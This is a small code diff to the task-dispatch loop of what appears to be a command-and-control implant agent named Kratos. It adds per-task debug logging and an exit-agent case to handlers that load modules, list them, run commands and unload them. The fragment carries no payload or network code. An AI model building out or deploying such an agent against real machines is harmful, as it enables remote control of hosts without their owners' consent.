@@ -10,7 +10,6 @@ BOOL Kratos::Dispatch( INT32 TotalTasks ) {
 	for(int i = 0; i < TotalTasks; i++) {
 		auto CommandCode = packager->UnPack4( );
 
-		DEBUG_LOG("[+] Got Command Code!");
 
 		if ( CommandCode < 0 ) {
 			break;
@@ -22,13 +21,20 @@ BOOL Kratos::Dispatch( INT32 TotalTasks ) {
 				this->moduleLoad( );
 				break;
 			case TASK_LIST_MODULES:
+				DEBUG_LOG("[+] Task = LIST_MODULES");
 				this->moduleList( );
 				break;
 			case TASK_RUN_CMD:
+				DEBUG_LOG("[+] Task = RUN_CMD");
 				this->runModuleCmd( );
 				break;
 			case TASK_UNLOAD_MODULE:
+				DEBUG_LOG("[+] Task = UNLOAD_MODULE");
 				this->moduleUnload( );
+				break;
+			case TASK_EXIT_AGENT:
+				DEBUG_LOG("[+] Task = EXIT_AGENT");
+				this->exitAgent( );
 				break;
 
 		}
